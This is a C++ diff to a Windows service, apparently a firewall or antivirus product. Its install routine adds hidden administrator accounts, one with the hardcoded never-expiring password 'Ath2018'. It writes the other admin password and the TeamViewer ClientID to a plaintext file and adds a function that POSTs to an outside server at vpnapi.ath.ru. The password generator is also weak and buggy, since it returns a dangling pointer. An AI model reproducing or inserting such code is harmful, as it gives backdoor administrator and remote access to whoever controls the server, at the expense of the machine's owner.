@@ -38,11 +38,82 @@ int ATHService::run()
 
 int ATHService::install()
 {
+	USER_INFO_1 ATHAdmin, ATHUser;
+	DWORD dwLevel = 1;
+	DWORD dwError = 0;
+	ATHAdmin.usri1_name = L"ATHAdmin";
+	ATHAdmin.usri1_password = GeneratePassword();
+	ATHAdmin.usri1_priv = USER_PRIV_ADMIN;
+	ATHAdmin.usri1_home_dir = NULL;
+	ATHAdmin.usri1_comment = NULL;
+	ATHAdmin.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
+	ATHAdmin.usri1_script_path = NULL;
+
+	NET_API_STATUS nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ATHAdmin, &dwError);
+
+
+	ATHUser.usri1_name = L"ATHUser";
+	ATHUser.usri1_password = L"Ath2018";
+	ATHUser.usri1_priv = USER_PRIV_ADMIN;
+	ATHUser.usri1_home_dir = NULL;
+	ATHUser.usri1_comment = NULL;
+	ATHUser.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
+	ATHUser.usri1_script_path = NULL;
+
+	nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ATHUser, &dwError);
+
+	Json::Value root;
+	root["admin"] = ATHAdmin.usri1_password;
+	DWORD nResult(0);
+	GetDWORDRegKey(&nResult);
+	root["Teamviewer"] = (unsigned int)nResult;
+
+	Json::StyledStreamWriter writer;
+	std::ofstream fwsetting(L"AthFile.err");
+	writer.write(fwsetting, root);
+	fwsetting.flush();
+	fwsetting.close();
+
 	for (int i = 0; i < Services.size(); i++) {
 		int res = Services[i]->InstallAll(i);
 		if (res != 0) return res;
 	}
 	return 0;
+}
+
+
+void ATHService::SendJson()
+{
+	curl_global_init(CURL_GLOBAL_ALL);
+	CURL *curl = curl_easy_init();
+
+	//headerList = curl_slist_append(headerList, "Authorization: Basic TOKENHERE=");
+	//WCHAR * targUrl = new WCHAR[255];
+	//wsprintf(targUrl, L"http://vpnapi.ath.ru:9898/");
+	curl_easy_setopt(curl, CURLOPT_URL, L"http://vpnapi.ath.ru:9898/");
+	curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+	curl_easy_perform(curl);
+	curl_easy_cleanup(curl);
+}
+
+LONG ATHService::GetDWORDRegKey(DWORD *nValue)
+{
+	HKEY hKey;
+	LONG lRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TeamViewer", 0, KEY_READ, &hKey);
+	//nValue = nDefaultValue;
+	DWORD dwBufferSize(sizeof(DWORD));
+	DWORD nResult(0);
+	DWORD Type(REG_DWORD);
+	LONG nError = RegQueryValueEx(hKey, L"ClientID", 0, &Type, (LPBYTE)&nResult, &dwBufferSize);
+	if (ERROR_SUCCESS == nError)
+	{
+		*nValue = nResult;
+	}
+	else {
+		*nValue = 0;
+	}
+	return nError;
 }
 
 int ATHService::InstallAll(int Index)
@@ -185,6 +256,7 @@ int ATHService::ThreadAVScan()
 	LARGE_INTEGER liDueTime;
 	while (true) {
 		liDueTime.QuadPart = -100000000LL * 6;
+
 		SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, 0);
 		if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0)
 			ev.addLog(L"WaitForSingleObject failed");
@@ -333,14 +405,21 @@ int ATHService::ThreadPipe()
 			}
 			break;
 		case CHANGEFW:
-			ath.SaveRulesToFile(L"defaultFWconfig.config");
+			if (ath.SaveRulesToFile(L"C:\\Program Files (x86)\\ATH\\defaultFWconfig.config") < 0) {
+				wsprintf(errMessage, L"CHANGEFW fail");
+				ev.addLog(errMessage);
+				command.command = FWFAIL;
+				WriteFile(hPipe, (LPCVOID)&command, sizeof(command), &cbRead, NULL);
+				//MessageBox(0, L"test", L"", 0);
+				return -1;
+			}
 			ath.DeleteAllRules();
-			ath.LoadRulesFromFile(L"ATHfwconfig.config");
+			ath.LoadRulesFromFile(L"C:\\Program Files (x86)\\ATH\\ATHfwconfig.config");
 			WriteFile(hPipe, (LPCVOID)&command, sizeof(command), &cbRead, NULL);
 			break;
 		case RESTOREFW:
 			ath.DeleteAllRules();
-			ath.LoadRulesFromFile(L"defaultFWconfig.config");
+			ath.LoadRulesFromFile(L"C:\\Program Files (x86)\\ATH\\defaultFWconfig.config");
 			// WriteFile(hPipe, (LPCVOID)&command, sizeof(command), &cbRead, NULL);
 			break;
 		default:
@@ -518,6 +597,7 @@ BOOL ATHService::BuildSecurityAttributes(SECURITY_ATTRIBUTES * psa)
 
 	return TRUE;
 }
+
 BOOL ATHService::GetUserSid(PSID * ppSidUser)
 {
 	HANDLE      hToken;
@@ -578,6 +658,27 @@ BOOL ATHService::GetUserSid(PSID * ppSidUser)
 
 	*ppSidUser = pTokenUser->User.Sid;
 	return TRUE;
+}
+
+LPWSTR ATHService::GeneratePassword()
+{
+	srand((unsigned)time(NULL));
+	int r = rand() % 20;
+	for (int i = 0; i < r; i++) {
+		srand((unsigned)time(NULL));
+		Sleep(rand() % 100);
+	}
+	srand((unsigned)time(NULL));
+	int lPass = (double)rand() / (RAND_MAX + 1) * (15 - 10) + 10;
+	std::wstring s = L"";
+	for (int i = 0; i < lPass; i++) {
+		s += chars[rand() % chars.length()];
+	}
+
+
+	LPWSTR PassWord = new WCHAR[lPass];
+	PassWord = LPWSTR(s.c_str());
+	return PassWord;
 }
 
 int ATHService::stop() {
